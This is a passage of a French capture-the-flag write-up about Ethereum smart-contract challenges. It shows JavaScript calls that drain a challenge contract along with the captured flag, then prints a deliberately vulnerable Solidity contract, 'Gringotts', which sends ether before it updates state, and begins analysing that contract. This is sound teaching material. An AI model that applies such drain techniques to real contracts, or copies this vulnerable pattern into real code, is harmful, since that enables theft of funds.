&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// dépouiller&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withdrawPiggyBank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Et on appelle &lt;code class=&quot;highlighter-rouge&quot;&gt;withdrawPiggyBank()&lt;/code&gt;pour récupérer les fonds. Le smart contract a été dépouillé. On peut alors récupérer notre flag en appuyant sur Check.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SANTA{N0_M0R3_B4D_R4ND0MN3SS_PL3AZ}&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;level-3---gringotts&quot;&gt;Level 3 - Gringotts&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 300&lt;/p&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Gringotts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;mapping&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sorceryAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;startStudyDate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     
        &lt;span class=&quot;nx&quot;&gt;startStudyDate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;modifier&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;isEligible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startStudyDate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;days&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;withdrawAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;isEligible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()){&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;sorceryAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;donateToSorcery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sorceryDestination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;sorceryAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sorceryDestination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;queryCreditOfSorcery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sorcerySource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sorceryAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sorcerySource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;analyse-2&quot;&gt;Analyse&lt;/h2&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Gringotts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notre smart contract s’appelle &lt;code class=&quot;highlighter-rouge&quot;&gt;Gringoots&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;mapping&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sorceryAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;startStudyDate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Il possède plusieurs champs, dont un tableau associatif &lt;code class=&quot;highlighter-rouge&quot;&gt;sorceryAllowance&lt;/code&gt;, qui fait correspondre à une &lt;code class=&quot;highlighter-rouge&quot;&gt;address&lt;/code&gt; à un &lt;code class=&quot;highlighter-rouge&quot;&gt;uint&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Exemple:&lt;/p&gt;

  &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sorceryAllowance[0x123] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x21
sorceryAllowance[0x321] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x98
sorceryAllowance[0x213] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x23
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;     
  &lt;span class=&quot;nx&quot;&gt;startStudyDate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le constructeur qui initialise différentes variables lors de la création du smart contrat.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;modifier&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;isEligible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;startStudyDate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;days&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;now&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;uint&lt;/code&gt;): current block timestamp (alias for &lt;code class=&quot;highlighter-rouge&quot;&gt;block.timestamp&lt;/code&gt;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;On retrouve également ce que l’on appelle un &lt;strong&gt;modifier&lt;/strong&gt;. On défini ce code comme des contraintes ou des conditions à respecter lors de l’appel à une fonction.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;startStudyDate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numberOfWithdrawls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;365&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;days&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dans cet exemple, pour exécuter &lt;code class=&quot;highlighter-rouge&quot;&gt;alreadyWithdrawn = false;&lt;/code&gt;, il faut d’abord que la condition du &lt;code class=&quot;highlighter-rouge&quot;&gt;require()&lt;/code&gt; soit vérifiée.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;withdrawAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;isEligible&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;allowancePerYear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()){&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;alreadyWithdrawn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
